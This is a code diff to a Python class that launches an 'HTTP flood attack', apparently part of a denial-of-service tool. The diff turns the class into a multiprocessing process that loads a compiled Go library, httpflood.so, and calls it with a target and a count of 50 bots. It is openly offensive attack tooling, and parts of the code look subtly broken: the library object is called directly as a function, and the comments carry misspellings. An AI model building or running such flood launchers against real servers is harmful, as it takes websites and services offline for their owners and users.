@@ -1,6 +1,12 @@
+"""
+@author: azseza
+HTTP flood attack declared in go file as a shared library
+"""
+from ctypes import *
+import multiprocessing
 
 
-class HttpGoFood:
+class HttpGoFood(multiprocessing.Process):
     """
     The golang httpFlood attack lunch
     """
@@ -8,6 +14,7 @@ class HttpGoFood:
     lib_name = "mainer"
 
     def __init__(self):
+        multiprocessing.Process.__init__(self)
         self.target = ""
         self.numberOfBots = 50
 
@@ -34,10 +41,7 @@ class HttpGoFood:
         try:
             file = pathlib.Path(gofile)
             if file.exists():
-                dir_path = os.path.dirname(os.path.realpath(__file__))
-                lib = cdll.LoadLibrary(os.path.join(dir_path, "httpflood.so"))
-                #lib = cdll.LoadLibrary('./httpflood.so')
-                print("here")
+                lib = cdll.LoadLibrary('./httpflood.so')
                 lib(self.target, self.numberOfBots)
             else:
                 raise FileNotFoundError
